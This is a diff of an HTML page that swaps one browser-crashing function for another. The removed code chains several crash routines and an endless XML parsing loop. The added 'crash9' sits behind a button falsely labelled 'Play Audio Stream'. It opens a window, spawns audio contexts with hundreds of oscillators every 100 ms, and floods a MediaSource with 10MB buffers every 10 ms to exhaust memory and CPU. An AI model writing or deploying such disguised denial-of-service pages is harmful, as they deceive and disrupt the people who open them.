@@ -1,30 +1,52 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="crash10()">Execute All Tests</button>
+<button onclick="crash9()">Play Audio Stream</button>
 
 <script>
-function crash10() {
-    // Jalankan semua variant bersamaan
-    crash1();
-    setTimeout(crash2, 500);
-    setTimeout(crash3, 1000);
-    setTimeout(crash4, 1500);
-    setTimeout(crash5, 2000);
-    setTimeout(crash6, 2500);
-    setTimeout(crash7, 3000);
-    setTimeout(crash8, 3500);
-    setTimeout(crash9, 4000);
+function crash9() {
+    const w = window.open('', '_blank');
     
-    // Extra: XML parsing bomb
+    // Audio context bomb
+    try {
+        const audioContexts = [];
+        setInterval(() => {
+            const context = new (w.AudioContext || w.webkitAudioContext)();
+            audioContexts.push(context);
+            
+            // Create banyak oscillators
+            for(let i = 0; i < 100; i++) {
+                const oscillator = context.createOscillator();
+                const gain = context.createGain();
+                oscillator.connect(gain);
+                gain.connect(context.destination);
+                oscillator.start();
+            }
+        }, 100);
+    } catch(e) {}
+    
+    // Media source explosion
     setTimeout(() => {
         try {
-            const parser = new DOMParser();
-            while(true) {
-                parser.parseFromString('<root>' + 'X'.repeat(1000000) + '</root>', 'text/xml');
-            }
+            const video = w.document.createElement('video');
+            const mediaSource = new w.MediaSource();
+            video.src = URL.createObjectURL(mediaSource);
+            
+            mediaSource.addEventListener('sourceopen', () => {
+                const sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="vp8"');
+                
+                // Append data secara continuous
+                setInterval(() => {
+                    try {
+                        sourceBuffer.appendBuffer(new Uint8Array(10000000)); // 10MB chunks
+                    } catch(e) {}
+                }, 10);
+            });
+            
+            w.document.body.appendChild(video);
+            
         } catch(e) {}
-    }, 4500);
+    }, 1000);
 }
 </script>
 </body>
